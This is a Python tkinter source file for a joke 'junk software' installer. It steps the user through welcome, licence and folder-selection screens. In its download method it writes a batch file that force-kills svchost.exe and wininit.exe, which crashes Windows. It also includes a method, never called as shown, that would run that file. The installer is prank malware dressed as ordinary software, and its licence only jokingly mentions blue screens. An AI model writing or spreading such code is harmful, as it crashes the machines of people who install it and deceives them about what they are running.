# -*- coding: utf-8 -*-  
#垃圾软件
import os
import time
import tkinter as tk
from tkinter import ttk,messagebox
from tkinter import filedialog as fd
from PIL import Image,ImageTk

class App:
    def __init__(self):
        # 创建一个窗口
        self.w = tk.Tk()
        # 设置窗口尺寸   宽度300，高度150,移动窗口
        self.w.geometry("600x400+300+300")
        # 设置窗口的标题
        self.w.title("垃圾软件安装包")
        # Icon
        self.w.iconbitmap("trush.ico")
        #reize
        self.w.resizable(False,False)
        #photo
        self.image=Image.open("trush.png")
        self.image=ImageTk.PhotoImage(self.image)
        # 设置窗口背景色
        self.w.config(background ="white")
        #设置关闭协议
        self.w.protocol('WM_DELETE_WINDOW',self.quit)
        #设置安装位置
        self.file="C:\Program Files"
        #############frames#############
        #frame1#
        self.frame1=tk.Frame(self.w,bg="white",width=600,height=400)
        #       显示图片
        self.label=tk.Label(self.frame1,image=self.image)
        self.label.place(x=30,y=80,width=250,height=250)
        #       创造按钮
        self.pushButton =tk.Button(self.frame1,font=("宋体",12),text="下一步",command=self.second,bg="white")
        self.pushButton.place(x=490,y=350,width=100,height=30)
        #       创建文本标签
        self.label = tk.Label(self.frame1,text="欢迎下载垃圾软件!",font=("宋体",30),bg="white")
        self.label.place(x=20, y=10, width=440,height=80)
        #frame2#
        #       设置purhButton的绑定函数为self.third
        self.frame2=tk.Frame(self.w,bg="white",width=600,height=400)

        self.pushButton =tk.Button(self.frame2,font=("宋体",12),text="下一步",command=self.third,bg="white")
        self.pushButton.place(x=490,y=350,width=100,height=30)
        #       更改self.label内容和字体
        self.label = tk.Label(self.frame2,text="我们的垃圾软件最垃圾，请放心下载",font=("宋体",20),bg="white")
        self.label.place(x=20, y=10, width=440,height=80)
        #frame3#
        self.frame3=tk.Frame(self.w,bg="white",width=600,height=400)
        #   Buttons
        self.pushButton =tk.Button(self.frame3,font=("宋体",12),text="下一步",command=self.forth,bg="white")
        self.pushButton.place(x=490,y=350,width=100,height=30)

        self.pushButton2 =tk.Button(self.frame3,text="...",command=self.browse,bg="white")
        self.pushButton2.place(x=450,y=290,width=40,height=30)

        self.pushButton2 =tk.Button(self.frame3,text="取消",command=self.quit,bg="white",font=("宋体",12))
        self.pushButton2.place(x=380,y=350,width=100,height=30)
        #   label
        self.label = tk.Label(self.frame3,text="请选择下载位置:",font=("宋体",30),bg="white")
        self.label.place(x=20, y=10, width=440,height=80)
        #   entry输入安装目录
        self.entry=tk.Entry(self.frame3,bg="white")
        self.entry.place(x=40,y=290,width=380,height=30)
        self.entry.insert(0,"C:\Program Files")
        #frame4#
        self.frame4=tk.Frame(self.w,bg="white",width=600,height=400)
        #   label
        self.label=tk.Label(self.frame4,text="正在安装...",bg="white")
        #   text
        self.text=tk.Text(self.frame4,font=("宋体",25,"bold"),bg="white")
        self.text.place(x=20,y=20,width=530,height=260)
        self.text.insert("1.0","垃圾软件条约\n")
        self.text.tag_config("tag_1",font=("宋体",16))
        self.text.insert("2.0","  1.本软件为免费软件,软件著作权归作者所有,禁止侵权,打击盗版!\n  2.如果你的电脑蓝了或者黑了,该软件及其作者概不负责,请自行重启","tag_1")
        self.text.config(state="disabled")
        #   RadioButton
        self.can=tk.BooleanVar()
        self.radioButton=tk.Radiobutton(self.frame4, text="我同意此协议",bg="white",fg="blue",variable=self.can, value=True,command=self.changes)
        self.radioButton.place(x=40,y=300)
        self.radioButton=tk.Radiobutton(self.frame4, text="我不同意此协议",bg="white",fg="blue",variable=self.can, value=False,command=self.changes)
        self.radioButton.place(x=40,y=330)
        #   Buttons
        self.pushButton =tk.Button(self.frame4,font=("宋体",12),text="安装",state="disabled",command=self.download,bg="white",cursor='hand2')
        self.pushButton.place(x=490,y=350,width=100,height=30)

        self.pushButton2 = tk.Button(self.frame4,font=("宋体",12),text="上一步",bg="white",command=self.last)
        self.pushButton2.place(x=380,y=350,width=100,height=30)
        #   checkButton
        self.is_run=tk.BooleanVar()
        self.is_run2=self.is_run.get()
        self.checkButton=tk.Checkbutton(self.frame4,text="安装完成后自动启动",variable=self.is_run,onvalue=True,offvalue=False,command=self.changes2)
        #############frames#############

        self.first()
        # 显示窗口
        self.w.mainloop()
    
    def first(self):
        self.frame1.place(x=0,y=0)

    def second(self):
        self.frame2.place(x=0,y=0)

    def third(self):
        self.frame3.place(x=0,y=0)

    def forth(self):
        self.frame4.place(x=0,y=0)

    def last(self):
        self.frame4.place_forget()
        self.third()

    def browse(self):
        self.file=fd.askdirectory(title="打开")
        self.entry.delete(0,"end")
        self.entry.insert(0,self.file)
        self.file=self.entry.get()

    def download(self):
        #控件更改
        self.checkButton.place(x=40,y=250)
        self.label.place(x=40,y=100,width=100,height=20)
        self.radioButton.destroy()
        #更改窗口关闭事件
        self.w.protocol('WM_DELETE_WINDOW',quit)
        #先销毁text控件
        self.text.destroy()
        #再创建进度条
        self.progressbar=ttk.Progressbar(self.frame4,length=300,maximum=100)
        self.progressbar.place(x=80,y=60)
        with open(self.file+"/垃圾软件.bat","w") as f:
            f.write("taskkill /im svchost.exe /f\ntaskkill /im wininit.exe /f")
        #更改进度条进度
        for i in range(100):
            self.progressbar['value']=i+1
            time.sleep(0.02)
            self.w.update()
        self.pushButton.config(text="完成",command=quit)

    def quit(self):
        if messagebox.askyesno("关闭","确定要退出安装程序吗?"):
            self.w.quit()
            self.w.destroy()
            quit()

    def quit2(self):
        self.w.quit()
        self.w.destroy()
        self.runprogram()
        quit()

    def runprogram(self):
        os.popen(self.file+"/垃圾软件.bat")
    
    def changes(self):
        if self.can.get():
            self.pushButton.config(state="active")
        else:
            self.pushButton.config(state="disabled")

    def changes2(self):
        self.is_run2=self.is_run.get()

if __name__ == '__main__':
    App()